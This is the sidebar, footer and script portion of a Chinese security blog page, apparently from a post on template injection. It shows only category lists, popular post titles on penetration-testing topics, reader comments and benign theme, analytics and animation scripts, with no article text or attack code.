<a href="https://www.cnblogs.com/bmjoker/category/1200606.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">web安全之中间件安全(3)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1279049.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">Windows/Linux应急响应(7)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1197209.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">xss跨站脚本攻击(9)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1274773.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">XXE与SSRF服务器端请求伪造(9)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1256326.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">常用工具(12)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1224511.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">互联网业务中常见的逻辑漏洞(6)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1196756.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">技术杂谈(36)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1222870.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">命令执行漏洞(2)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1390408.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">内网渗透(7)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1224466.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">其他常见漏洞与漏洞复现(27)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1201498.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">受益匪浅的ctf(25)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1216086.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">文件包含漏洞(2)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1207892.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">文件上传漏洞(8)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1828639.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">源码审计(7)</a>
 
                </li>                
            
        </ul>


    </div>    
    <div id="sidebar_imagecategory" class="catListImageCategory sidebar-block">
        <h3 class="catListTitle">
            
相册


        </h3>

        <ul>

                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/gallery/1281548.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="nofollow noopener noreferrer" target="">linux安全加固建议(1)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/gallery/1344801.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="nofollow noopener noreferrer" target="">背景图(7)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/gallery/1264648.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="nofollow noopener noreferrer" target="">常见web漏洞(1)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/gallery/1284864.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="nofollow noopener noreferrer" target="">业务安全实战指南(2)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/gallery/1358967.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="nofollow noopener noreferrer" target="">运维安全(1)</a>
 
                </li>                
            
        </ul>


    </div>    
</div>

<!-- 最新评论 -->
<!-- 阅读排行榜 -->
<div id="sidebar_topviewedposts" class="sidebar-block"><div class="catListView">
    <h3 class="catListTitle">
        <a href="https://www.cnblogs.com/bmjoker/most-viewed" class="sidebar-card-title-a">
    阅读排行榜
</a>

    </h3>
    <div id="TopViewPostsBlock">
        <ul style="word-break:break-all">
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9548962.html">
                            1. 10.Redis未授权访问漏洞复现与利用(59496)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/13508538.html">
                            2. 1. SSTI（模板注入）漏洞（入门篇）(29485)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/10336247.html">
                            3. 1.我所了解的内网渗透(20996)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/10051014.html">
                            4. 9.利用msfvenom生成木马(18595)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9074291.html">
                            5. 8. CTF综合靶机渗透(一)(16953)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9892653.html">
                            6. 16.Tomcat弱口令 &amp;&amp; 后台getshell漏洞(15903)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9977881.html">
                            7. 8.使用hydra对端口进行爆破(14743)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/8833316.html">
                            8. 3.黑客常用端口利用总结(14326)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/10355979.html">
                            9. 5.内网渗透之PTH&amp;PTT&amp;PTK(13323)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9060833.html">
                            10. 2. docker 容器的管理（创建、查看、启动、终止、删除）(12937)
                        </a>
                    </li>
        </ul>
    </div>
</div></div>

<!-- 评论排行榜 -->
<div id="sidebar_topcommentedposts" class="sidebar-block"><div class="catListFeedback">
    <h3 class="catListTitle">
        <a href="https://www.cnblogs.com/bmjoker/most-commented" class="sidebar-card-title-a">评论排行榜</a>

    </h3>
    <div id="TopFeedbackPostsBlock">
        <ul style="word-break:break-all">
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9074291.html">
                            1. 8. CTF综合靶机渗透(一)(8)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9548962.html">
                            2. 10.Redis未授权访问漏洞复现与利用(6)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/13508538.html">
                            3. 1. SSTI（模板注入）漏洞（入门篇）(4)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/10336247.html">
                            4. 1.我所了解的内网渗透(4)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/8890516.html">
                            5. 3. 关于sql注入的综合题(4)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/8797027.html">
                            6. 1.1 sql注入分类与详解(4)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/13742666.html">
                            7. 3. php反序列化从入门到放弃(入门篇)(3)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/11778478.html">
                            8. 26.Apache Solr RCE(3)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/10723432.html">
                            9. 7.内网渗透之windows认证机制(3)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/bmjoker/p/9759761.html">
                            10. 11.Weblogic-SSRF漏洞复现(3)
                        </a>
                    </li>
        </ul>
    </div>
</div></div>

<!-- 推荐排行榜 -->
<div id="sidebar_topdiggedposts" class="sidebar-block">
<div id="topdigg_posts_wrap">
    <div class="catListView">
        <h3 class="catListTitle">
            <a href="https://www.cnblogs.com/bmjoker/most-liked" class="sidebar-card-title-a">推荐排行榜</a>

        </h3>
        <div id="TopDiggPostsBlock">
            <ul style="word-break: break-all">
                        <li>
                            <a href="https://www.cnblogs.com/bmjoker/p/13508538.html">
                                1. 1. SSTI（模板注入）漏洞（入门篇）(26)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/bmjoker/p/8833316.html">
                                2. 3.黑客常用端口利用总结(20)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/bmjoker/p/9548962.html">
                                3. 10.Redis未授权访问漏洞复现与利用(16)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/bmjoker/p/9074291.html">
                                4. 8. CTF综合靶机渗透(一)(11)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/bmjoker/p/13742666.html">
                                5. 3. php反序列化从入门到放弃(入门篇)(8)
                            </a>
                        </li>
            </ul>
        </div>
    </div>
</div></div><div id="sidebar_recentcomments" class="sidebar-block"><div class="catListComment">
<h3 class="catListTitle"><a href="https://www.cnblogs.com/bmjoker/comments" class="sidebar-card-title-a">最新评论</a></h3>
    <div class="RecentCommentBlock">
        <ul>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. Re:1. SSTI（模板注入）漏洞（入门篇）</a></li>
                <li class="recent_comment_body"><p>大佬写的太详细了</p>
</li>
                <li class="recent_comment_author">--CQY_57</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/8833316.html">2. Re:3.黑客常用端口利用总结</a></li>
                <li class="recent_comment_body"><p>大佬，你的博客园配置能发下吗</p>
</li>
                <li class="recent_comment_author">--Cold_Ying</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">3. Re:3. php反序列化从入门到放弃(入门篇)</a></li>
                <li class="recent_comment_body"><p>很好，学到了</p>
</li>
                <li class="recent_comment_author">--Tru1-</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">4. Re:3. php反序列化从入门到放弃(入门篇)</a></li>
                <li class="recent_comment_body"><p>很好，学到了</p>
</li>
                <li class="recent_comment_author">--Tru1-</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/10723432.html">5. Re:7.内网渗透之windows认证机制</a></li>
                <li class="recent_comment_body"><p>大佬QQ联系方式呢</p>
</li>
                <li class="recent_comment_author">--MKID1412</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/10506623.html">6. Re:7. Smali基础语法总结</a></li>
                <li class="recent_comment_body"><p>请问博主阅读密码是多少、？？</p>
</li>
                <li class="recent_comment_author">--caocol</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/10723432.html">7. Re:7.内网渗透之windows认证机制</a></li>
                <li class="recent_comment_body">@MKID1412 建议在练习中成长！可以从暗月，或者红日靶场（）来入门，学习内网的一些攻击手法 工具的使用（cs，msf） 内网信息搜集（存活扫描，定位域控，定位域管，密码抓取[本地+三方软件]）....</li>
                <li class="recent_comment_author">--bmjoker</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">8. Re:3. php反序列化从入门到放弃(入门篇)</a></li>
                <li class="recent_comment_body"><p>太棒了 感谢感谢！</p>
</li>
                <li class="recent_comment_author">--浪漫峨眉峰</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/10723432.html">9. Re:7.内网渗透之windows认证机制</a></li>
                <li class="recent_comment_body"><p>大佬能否说下你的学习路线</p>
</li>
                <li class="recent_comment_author">--MKID1412</li>
                <li class="recent_comment_title"><a href="https://www.cnblogs.com/bmjoker/p/13653563.html">10. Re:2. SSTI（模板注入）漏洞（cms实例篇）</a></li>
                <li class="recent_comment_body"><p>感谢师傅的文章，学到很多</p>
</li>
                <li class="recent_comment_author">--Joker-qi</li>
        </ul>
    </div>
</div>

</div>


</div>
                    <script>loadBlogSideColumn();</script>
			</div>			
		</div><!--end: sideBarMain -->
	</div><!--end: sideBar 侧边栏容器 -->
	<div class="clear"></div>
	</div><!--end: main -->
	<div class="clear"></div>
	<div id="footer" class="footer-t1"><div class="footer-image"></div><div class="footer-box"><div class="footer-text">[ 夜深忽梦少年事<span class="footer-text-icon"><span class="iconfont icon-xl" style="color: red;font-size: 16px;"></span></span>唯梦闲人不梦君 ]</div><div><span id="blogRunTimeSpan">This blog has running : 1909 d 15 h 31 m 53 s</span><span class="my-face">ღゝ◡╹)ノ♡</span></div><div id="blogrollInfo">友情链接：<a href="https://linuz.me/" target="_blank">Linuz's Blog</a><span style="margin: 0 3px;">/</span><a href="https://blog.ixuchao.cn/" target="_blank">Archerx's Blog</a><span style="margin: 0 3px;">/</span><a href="https://msg.cnblogs.com/send/bmjoker" target="_blank">申请坑位</a><span style="margin: 0 3px;">/</span><a href="https://msg.cnblogs.com/send/bmjoker" target="_blank">申请坑位</a><span style="margin: 0 3px;">/</span><a href="https://msg.cnblogs.com/send/bmjoker" target="_blank">申请坑位</a></div><div>
		
Copyright © 2023 bmjoker
Powered by .NET 7.0 on Kubernetes



	</div><div id="cnzzInfo"></div><div id="themeInfo">Theme version: <a href="https://github.com/BNDong/Cnblogs-Theme-SimpleMemory/tree/v1.3.3" target="_blank" style="color: #888;text-decoration: underline;">v1.3.3</a> / Loading theme version: <a href="https://github.com/BNDong/Cnblogs-Theme-SimpleMemory/tree/v1.3.3" target="_blank" style="color: #888;text-decoration: underline;">v1.3.3</a></div></div></div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->



    

    <input type="hidden" id="antiforgery_token" value="CfDJ8DuWIYDefEVJtUW7VadsHY8HNJ5B5vKkmjmRr8OZdvp-WtrwdIK-xsi_bkSIKPGfspKCmV8BusMeqEvIY_FbnAwAAiNrws-hfem30YRMwEO9u69JN2Miewc9bafk-_kG1rRC0766slsa1kVgnus_5_k">
    <script async="" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    var kv = getGACustom();
    if (kv) {
        gtag('set', kv);
    }
    gtag('config', 'UA-476124-1');
</script>
<script defer="" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/hm.js.下载"></script>

<script type="text/javascript">
    window.cnblogsConfig = {
        GhVersions    : 'v1.3.3', // 版本
        blogUser      : "bmjoker", // 用户名
        blogAvatar    : "https://pic.cnblogs.com/avatar/1344396/20190124140229.png", // 用户头像
        blogStartDate : "2018-04-01", // 入园时间，年-月-日。入园时间查看方法：鼠标停留园龄时间上，会显示入园时间
        menuCustomList: { // 自定义菜单数据，显示在正常数据下方
            "渗透平台": { // 标题
                "data": [ // 列表数据 ['列表', '链接']
                    ['渗透师', 'https://www.shentoushi.top/'],
                    ['黑客街', 'https://www.hackjie.com/'],
                    ['HackTA-黑塔', 'http://www.secsearch.top//'],
                    ['雨苁', 'https://www.ddosi.com/'],
                ],
                "icon": "icon-brush_fill" // 配置图标，参考文档：本博客字体图标库及其更换方法
            },
        },
        // ---- 网站配置 ----
        webpageTitleOnblur        : "(◍´꒳`◍) Hi, bmjoker", // 当前页失去焦点，页面title显示文字
        webpageTitleOnblurTimeOut : 500, // 当前页失去焦点，页面title变化，延时时间，单位毫秒
        webpageTitleFocus         : "(*´∇｀*) 欢迎回来！", // 当前页获取焦点，页面title显示文字，显示后延时恢复原title
        webpageTitleFocusTimeOut  : 1000, // 当前页获取焦点，页面title变化，延时时间，单位毫秒
        webpageIcon : "https://files-cdn.cnblogs.com/files/bmjoker/530836.gif", // 网站图标
        essayTopAnimationRendered: false,
        footerStyle: 1,
         essayTitleStyle: true,
        menuUserInfoBgImg : "https://files.dbnuo.com/wallpaper/menu_bg.gif",
        menuNavList:  [
            ['GitHub', 'https://github.com/bmjoker'],
            ['CNBlogs', 'https://www.cnblogs.com/bmjoker'],
            ['自建XSS平台', 'http://47.107.136.25/xsser//index.php?do=login']
        ],
        bottomBlogroll: [ // 友情链接，[[链接名,链接]....]
            ["Linuz's Blog", 'https://linuz.me/'],
            ["Archerx's Blog", 'https://blog.ixuchao.cn/'],
            ["申请坑位", 'https://msg.cnblogs.com/send/bmjoker'],
            ["申请坑位", 'https://msg.cnblogs.com/send/bmjoker'],
            ["申请坑位", 'https://msg.cnblogs.com/send/bmjoker'],
        ],
        bottomText: {  // 页脚标语
            icon: "❤️", // 图标
            left : "夜深忽梦少年事", // 图标左侧文字
            right: "唯梦闲人不梦君"  // 图标右侧文字
        },
        homeTopImg: [
            "https://w.wallhaven.cc/full/4y/wallhaven-4ylgl0.jpg",
            "https://w.wallhaven.cc/full/ne/wallhaven-ne7lr8.jpg",
            "https://w.wallhaven.cc/full/k9/wallhaven-k9p8l6.jpg",
            "https://w.wallhaven.cc/full/xl/wallhaven-xl67ov.jpg",
            "https://w.wallhaven.cc/full/dg/wallhaven-dgekog.jpg",
            "https://w.wallhaven.cc/full/ne/wallhaven-neqwon.jpg",
            "https://w.wallhaven.cc/full/47/wallhaven-47ldq9.jpg",
            "https://w.wallhaven.cc/full/lm/wallhaven-lm2762.jpg",
            "https://files.dbnuo.com/wallpaper/wallhaven-83w372.webp",
        ],
        homeBannerTextType: "jinrishici",
        essayTopImg: [
            "https://w.wallhaven.cc/full/d5/wallhaven-d5yzvg.jpg",
            "https://w.wallhaven.cc/full/4d/wallhaven-4d38m0.jpg",
            "https://w.wallhaven.cc/full/4g/wallhaven-4gj334.jpg",
            "https://w.wallhaven.cc/full/dg/wallhaven-dg6pel.jpg",
            "https://w.wallhaven.cc/full/13/wallhaven-13dv2g.jpg",
            "https://w.wallhaven.cc/full/wy/wallhaven-wyomo6.jpg",
            "https://w.wallhaven.cc/full/j8/wallhaven-j82g35.jpg",
            "https://w.wallhaven.cc/full/lq/wallhaven-lqddel.png",
            "https://w.wallhaven.cc/full/83/wallhaven-83dkk1.jpg",
            "https://w.wallhaven.cc/full/r2/wallhaven-r2yjg1.jpg",
            "https://w.wallhaven.cc/full/wy/wallhaven-wymo2p.jpg",
            "https://w.wallhaven.cc/full/2e/wallhaven-2e37y9.jpg",
            "https://w.wallhaven.cc/full/j5/wallhaven-j5y525.jpg",
        ],
        essayCodeHighlightingType: "highlightjs",
        essayCodeHighlighting: "a11y-dark",

    }
</script><script type="text/javascript">
  !function(){
  
 function n(n,e,t){
  
 return n.getAttribute(e)||t
  
 }
  
 function e(n){
  
 return document.getElementsByTagName(n)
  
 }
  
 function t(){
  
 var t=e("script"),o=t.length,i=t[o-1];
  
 return{
  
 l:o,z:n(i,"zIndex",-1),o:n(i,"opacity",.5),c:n(i,"color","0,0,0"),n:n(i,"count",99)
  
 }
  
 }
  
 function o(){
  
 a=m.width=window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth,
  
 c=m.height=window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight
  
 }
  
 function i(){
  
 r.clearRect(0,0,a,c);
  
 var n,e,t,o,m,l;
  
 s.forEach(function(i,x){
  
 for(i.x+=i.xa,i.y+=i.ya,i.xa*=i.x>a||i.x<0?-1:1,i.ya*=i.y>c||i.y<0?-1:1,r.fillRect(i.x-.5,i.y-.5,1,1),e=x+1;e<u.length;e++)n=u[e],
  
 null!==n.x&&null!==n.y&&(o=i.x-n.x,m=i.y-n.y,
  
 l=o*o+m*m,l<n.max&&(n===y&&l>=n.max/2&&(i.x-=.03*o,i.y-=.03*m),  
 t=(n.max-l)/n.max,r.beginPath(),r.lineWidth=t/2,r.strokeStyle="rgba("+d.c+","+(t+.2)+")",r.moveTo(i.x,i.y),r.lineTo(n.x,n.y),r.stroke()))
  
 }),
 
 x(i)
  
 }
  
 var a,c,u,m=document.createElement("canvas"),
  
 d=t(),l="c_n"+d.l,r=m.getContext("2d-disabled"),
x=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||
  
 function(n){
 
 window.setTimeout(n,1e3/45)  
 },
  
 w=Math.random,y={x:null,y:null,max:2e4};m.id=l,m.style.cssText="position:fixed;top:0;left:0;z-index:"+d.z+";opacity:"+d.o,e("body")[0].appendChild(m),o(),window.onresize=o,
  
 window.onmousemove=function(n){
  
 n=n||window.event,y.x=n.clientX,y.y=n.clientY
  
 },
  
 window.onmouseout=function(){
  
 y.x=null,y.y=null
  
 };
  
 for(var s=[],f=0;d.n>f;f++){
  
 var h=w()*a,g=w()*c,v=2*w()-1,p=2*w()-1;s.push({x:h,y:g,xa:v,ya:p,max:6e3})
  
 }
  
 u=s.concat([y]),
  
 setTimeout(function(){i()},100)
  
 }();
  
 </script><canvas id="c_n27" width="1298" height="616" style="position: fixed; top: 0px; left: 0px; z-index: -1; opacity: 0.5;"></canvas><script type="text/javascript">getFollowStatus('c73a3809-7f71-486b-a353-08d5782f1af4');</script></body></html>